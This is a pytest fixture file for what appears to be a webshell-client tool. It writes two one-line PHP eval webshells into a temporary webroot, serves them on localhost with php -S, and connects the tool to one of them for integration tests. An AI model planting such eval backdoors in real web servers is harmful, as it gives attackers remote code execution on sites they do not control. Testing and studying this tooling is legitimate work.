"""Shared fixtures.

The integration fixture boots a throwaway PHP target with ``php -S`` and a
known one-line webshell, so the wire protocol is exercised against a real PHP
interpreter — the safety net that makes the Py2->Py3 rewrite trustworthy.
Tests that need it are skipped automatically when ``php`` is not installed.
"""

from __future__ import annotations

import shutil
import socket
import subprocess
import time
from collections.abc import Iterator
from pathlib import Path

import pytest
import requests

from webshell_sniper.config import Config
from webshell_sniper.core.webshell import WebShell


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture(scope="session")
def php_target(tmp_path_factory: pytest.TempPathFactory) -> Iterator[dict[str, object]]:
    if shutil.which("php") is None:
        pytest.skip("php not installed")

    webroot = tmp_path_factory.mktemp("webroot")
    (webroot / "index.php").write_text("<?php @eval($_POST['c']);")
    (webroot / "get.php").write_text("<?php @eval($_GET['g']);")
    (webroot / "secret.txt").write_text("hello-from-target")
    (webroot / "sub").mkdir()
    (webroot / "sub" / "data.txt").write_text("nested-file")

    port = _free_port()
    proc = subprocess.Popen(
        ["php", "-S", f"127.0.0.1:{port}", "-t", str(webroot)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    base = f"http://127.0.0.1:{port}"
    try:
        for _ in range(50):
            try:
                requests.get(f"{base}/index.php", timeout=0.5)
                break
            except requests.RequestException:
                time.sleep(0.1)
        else:
            pytest.skip("php -S did not start")
        yield {"base": base, "webroot": webroot}
    finally:
        proc.terminate()
        proc.wait(timeout=5)


@pytest.fixture
def live_shell(php_target: dict[str, object], tmp_path: Path) -> WebShell:
    config = Config(output_dir=tmp_path)
    ws = WebShell(f"{php_target['base']}/index.php", "POST", "c", config)
    assert ws.connect(), "could not connect to php target"
    return ws
